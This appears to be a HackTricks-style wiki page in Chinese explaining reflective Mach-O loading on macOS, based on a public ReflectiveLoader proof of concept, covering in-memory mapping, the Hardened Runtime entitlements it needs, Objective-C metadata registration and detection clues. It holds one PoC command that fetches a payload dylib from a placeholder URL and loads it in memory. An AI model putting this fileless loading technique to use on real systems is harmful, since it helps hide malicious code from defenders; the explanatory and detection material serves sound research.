# macOS 上的 Reflective Mach-O Loading

{{#include ../../../banners/hacktricks-training.md}}

Reflective loader 会从进程自身已有的字节中映射 Mach-O 映像，然后链接该映像并运行其初始化函数，而无需请求系统 loader 打开 payload 文件。这是**进程内代码执行**，不是权限提升或远程进程注入原语。<sup>[[2]](#references)</sup>

在较新的 macOS 上，旧的 `NSCreateObjectFileImageFromMemory`/`NSLinkModule` 路径会将映像写入磁盘。ReflectiveLoader 则嵌入了较早版本的 Apple dyld 加载代码；Wardle 展示了该方法在 macOS 15 和 26 上的运行情况。<sup>[[2]](#references)[[3]](#references)</sup>

如果 loader 使用 Hardened Runtime，其未签名的内存代码需要可执行内存例外，例如 `com.apple.security.cs.allow-unsigned-executable-memory` 或 `com.apple.security.cs.disable-executable-page-protection`；否则代码签名强制机制会阻止执行。这是 loader 的签名限制，不是权限提升原语。请参阅 [macOS entitlements 参考](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory)。<sup>[[2]](#references)</sup>

对于 PoC，请提供一个 URL，用于提供原始 Mach-O **bundle、framework 或 dylib**。其 `main.mm` 会拒绝空下载，并说明不支持使用 `LC_DYLD_CHAINED_FIXUPS` 的 payload。也接受本地路径，但这种输入方式并非无文件工作流。URL 方式会将字节读入 `NSData`，并将其缓冲区和长度传给 `custom_dlopen_from_memory`。<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

嵌入式 loader 会调用 `ImageLoaderMachO::instantiateFromMemory`，然后调用 `image->link`。它会在 linking 之后、`image->runInitializers` 之前注册 Objective-C 元数据；后者会执行 constructors。<sup>[[5]](#references)</sup> 如果未注册，发送 Objective-C 消息的 constructor 可能会因 `unrecognized selector sent to instance` 而失败。<sup>[[3]](#references)</sup> 请参阅 [dyld 的常规 image-loading 流程](macos-library-injection/macos-dyld-process.md#flow)和 [Mach-O sections 参考](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections)。

## 激活 Objective-C 元数据

与常规 dyld 加载不同，嵌入较旧的 image loader 不会自动让 payload 的 Objective-C 元数据可供 `libobjc` 使用。<sup>[[3]](#references)</sup> 改编后的 LLVM JIT 方法会扫描映射的 `__DATA` 和 `__DATA_CONST` Objective-C sections，然后在 constructors 运行前执行以下步骤：<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. 按 `sizeof(SEL)` 的步长遍历 `__objc_selrefs`。使用 `sel_getName` 获取每个非空 selector 的名称，将其传递给 `sel_registerName`，并将 section 中的指针替换为规范的 `SEL`。
2. 从 `__objc_classlist` 收集类，并使用 `objc_readClassPair` 注册它们，同时先解析 superclass 依赖项。
3. 将 `__objc_classrefs` 和 `__objc_superrefs` 中的引用重写为已注册的类或 metaclass，并从 `__objc_catlist` 附加 category methods。

例如，`ObjCRuntime.cpp` 中的 selector 修复等效于：<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

该 PoC 依赖 Objective-C runtime 的内部行为，且不支持 Mach-O 格式的所有特性，因此其中的注册代码是实现参考，而非通用的即插即用 loader。<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> 对引用到的 Apple 类和方法，以及 payload 定义的类，都需要进行注册。<sup>[[3]](#references)</sup>

在作者的测试中，通过反射加载的 image 不会出现在 `dyld_all_image_infos` 中。其匿名可执行映射可能会在 `vmmap` 中显示为未命名的 `dylib` 区域；采样到的栈帧可能会显示为 `<unknown binary>`。这些只是检查线索，不能可靠地将其归因于此 loader；访问其他进程的 task 信息受 entitlement 限制。有关进程访问限制，请参阅 [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md)。<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT、macOS 上的 Objective-C 和 Swift：知识汇总](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [恢复 macOS 上的反射式代码加载（第一部分）](https://objective-see.org/blog/blog_0x7C.html)
- [3] [恢复 macOS 上的反射式代码加载（第二部分）](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
